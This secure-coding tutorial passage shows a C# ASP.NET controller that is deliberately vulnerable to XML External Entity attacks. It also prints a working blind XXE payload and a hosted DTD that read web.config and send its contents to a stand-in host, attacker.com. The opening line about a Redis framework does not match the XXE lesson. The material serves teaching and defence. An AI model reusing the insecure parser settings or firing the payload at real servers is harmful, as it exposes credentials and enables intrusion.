This framework provides secure, high-performance Redis operations without command injection risks.

**Operational Security Considerations:**

- **Logging & Monitoring**: Log all security-relevant events (authentication attempts, authorization failures, suspicious patterns) to a centralized logging system for detection and forensic analysis.
- **Detection**: Implement alerts for anomalous behavior such as repeated failed attempts, unusual access patterns, or privilege escalation attempts.
- **Least Privilege**: Ensure services and users operate with minimum necessary permissions to limit blast radius of potential compromises.
- **Defense-in-Depth**: Layer multiple security controls (input validation, parameterized queries, WAF, rate limiting, network segmentation) so that failure of one control doesn't lead to full compromise.

XML parsing is extremely dangerous when handling untrusted input because of XML External Entity (XXE) attacks. The most insidious variant is Blind XXE with Out-of-Band (OOB) data exfiltration, where attackers can steal data even when they don't see the parsed output directly.

**VULNERABLE CODE**:

```csharp
using System;
using System.IO;
using System.Xml;
using Microsoft.AspNetCore.Mvc;

namespace VulnerableApp.Controllers
{
    [ApiController]
    [Route("api/[controller]")]
    public class ConfigController : ControllerBase
    {
        [HttpPost("upload")]
        public IActionResult UploadConfig()
        {
            using var reader = new StreamReader(Request.Body);
            string xmlContent = reader.ReadToEnd();

            // VULNERABLE: Default XmlDocument allows DTD processing
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(xmlContent);

            // Even if we don't return XML content, blind XXE still works
            string configName = doc.SelectSingleNode("//name")?.InnerText ?? "Unknown";

            return Ok(new { message = $"Configuration '{configName}' processed successfully" });
        }

        [HttpPost("validate")]
        public IActionResult ValidateConfig()
        {
            using var reader = new StreamReader(Request.Body);
            string xmlContent = reader.ReadToEnd();

            // VULNERABLE: XmlReader with insecure settings
            XmlReaderSettings settings = new XmlReaderSettings();
            settings.DtdProcessing = DtdProcessing.Parse; // Dangerous!
            settings.XmlResolver = new XmlUrlResolver(); // Allows external entities

            using var stringReader = new StringReader(xmlContent);
            using var xmlReader = XmlReader.Create(stringReader, settings);

            while (xmlReader.Read()) { }

            return Ok(new { valid = true });
        }
    }
}
```

**Attack Payload - Blind XXE with OOB Exfiltration**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY % file SYSTEM "file:///c:/inetpub/wwwroot/web.config">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<config>
  <name>test</name>
</config>
```

**Attacker's evil.dtd hosted on attacker.com**:
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/collect?data=%file;'>">
%all;
```

**Why This Is Dangerous**:
- Even when XML content isn't returned to the user, the server makes outbound requests to attacker-controlled servers
- File contents (credentials, connection strings, API keys) are exfiltrated via HTTP/DNS requests
- The attack bypasses firewalls since it uses outbound connections
- Internal network services can be probed via SSRF through XXE

